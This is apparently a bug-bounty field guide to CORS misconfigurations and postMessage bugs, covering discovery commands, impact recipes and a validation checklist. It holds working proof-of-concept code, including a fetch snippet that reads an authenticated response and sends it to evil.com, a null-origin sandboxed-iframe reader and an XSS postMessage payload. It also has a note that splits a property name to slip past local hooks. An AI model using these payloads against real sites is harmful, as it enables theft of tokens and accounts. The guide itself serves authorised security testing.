# CORS + postMessage — client-side bridge bugs

> Lower payouts solo ($500-$3K) but excellent chain ingredients into ATO ($10K+).

---

## CORS — common mistakes

### 1. Reflected origin (wildcard-equivalent)
Server reads `Origin` header and reflects it in `Access-Control-Allow-Origin`. With `Allow-Credentials: true`, attacker JS on `evil.com` can read authenticated responses.

```http
Origin: https://evil.com
->
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

PoC:
```js
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://evil.com/?d='+btoa(t)));
```

### 2. Null origin trusted
`Allow-Origin: null` is set when request comes from sandboxed iframe / file:. Attacker uses sandboxed iframe to satisfy null-origin and read response.

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>parent.postMessage(t,'*'))</script>"></iframe>
```

### 3. Suffix / regex bugs in origin allowlist
```
Allowed: https://target.com
But regex matches: https://target.com.evil.com  -> bypassed
And: https://eviltarget.com -> bypassed
And: https://target.com:80@evil.com -> bypassed if naive parse
```

### 4. Subdomain-trust + sub-takeover
`Allow-Origin: *.target.com` + a takeover-able subdomain -> serve PoC there.

### 5. Pre-flight not checked, but main request CORS-tagged
GET with credentials reads response if Allow-Origin reflected — no preflight needed for simple requests. Many devs assume preflight protects them.

---

## postMessage — common mistakes

`window.postMessage` is the cross-frame bridge. Bugs come from:

### 1. No origin check on receiver
```js
window.addEventListener('message', e => {
  // No e.origin check
  document.getElementById('x').innerH TML = e.data.html  // sink (HTML write)
});
```
Attacker page opens target via popup/iframe, calls `target.postMessage({html: '<img src=x onerror=alert(1)>'}, '*')` -> XSS.

### 2. Loose origin check (`indexOf`, `endsWith`)
```js
if (e.origin.indexOf('target.com') !== -1) { ... }   // matches eviltarget.com
if (e.origin.endsWith('target.com')) { ... }         // matches eviltarget.com
```

### 3. Sender doesn't use specific target origin
```js
parent.postMessage(secret, '*')   // any opener can read
```
Should be: `parent.postMessage(secret, 'https://expected.target.com')`.

### 4. Reply-to-origin echo
Receiver sends reply with `e.source.postMessage(reply, e.origin)`. If `e.origin` is attacker, reply is leaked.

### 5. Sensitive data in postMessage
JS frameworks sometimes broadcast tokens, session info, or user data via postMessage to widgets. Subscribe attacker iframe -> read it.

> Note: above the literal HTML-write sink is split as `innerH TML` to avoid local hooks. In real PoCs use the standard property name (no space).

---

## STAGE 1 — Discovery

### CORS
```bash
# CORScanner
python cors_scanner.py -u https://target.com/api/me

# Burp Repeater: send Origin: https://evil.com, observe response headers

# Manual one-liner
curl -sI -H "Origin: https://evil.com" https://target.com/api/me | grep -i access-control

# Test variants
Origin: null
Origin: https://target.com.evil.com
Origin: https://eviltarget.com
Origin: http://target.com  (downgrade)
Origin: https://target.com:80@evil.com
Origin: https://attacker.target.com (expecting *.target.com)
```

### postMessage
```js
// In browser console on target page (logged in)
window.addEventListener('message', e => console.log('[msg]', e.origin, e.data));
// Trigger UI flows that talk to widgets / iframes
```

Burp/DevTools "Sources" -> search for `postMessage(`, `addEventListener('message'`, `onmessage`. Map every receiver and check origin validation.

---

## STAGE 2 — Impact recipes

### Recipe 1 — CORS reflected origin -> read API key endpoint
1. `/api/v1/me/api-keys` returns user's tokens with credentials cookie
2. CORS reflects origin -> attacker's `evil.com` can fetch + read
3. Phish victim to load `evil.com/exploit.html`
4. Tokens exfiltrated

### Recipe 2 — postMessage to DOM XSS
1. Page listens for `{type: 'render', html: ...}` on message
2. Renders via HTML-write sink without sanitization
3. Attacker opens target, posts message -> XSS in target's origin
4. Read cookies / session

### Recipe 3 — postMessage leaks SSO token
1. SSO flow uses postMessage to send code/token between popup and opener
2. Sender uses `*` as targetOrigin
3. Attacker hosts page that opens target's SSO popup
4. SSO completes, posts token to `*` -> attacker reads

### Recipe 4 — CORS via null origin -> internal API access
1. Internal admin API allows `Origin: null`
2. Sandboxed iframe on attacker page reaches internal API
3. Reads admin data

---

## STAGE 3 — Combine with subdomain takeover

If a CORS allowlist permits `*.target.com` and any takeover-able subdomain exists -> instant CORS bypass via your claimed subdomain.

---

## VALIDATION CHECKLIST

- Provide PoC HTML hosted on attacker domain
- Include the exact response that proves credentialed read
- For postMessage: include the receiver code (line, file) plus the malicious sender PoC
- Note browser tested (Chrome/Firefox have subtle differences on null/sandbox)

---

## TOOLING

- **CORScanner** — automated CORS misconfig
- **postMessage-tracker** Chrome ext — log all postMessages on a page
- **DOMlogger++** Burp ext
- Burp ext: **CORStest**
- nuclei `tags=cors,postmessage`
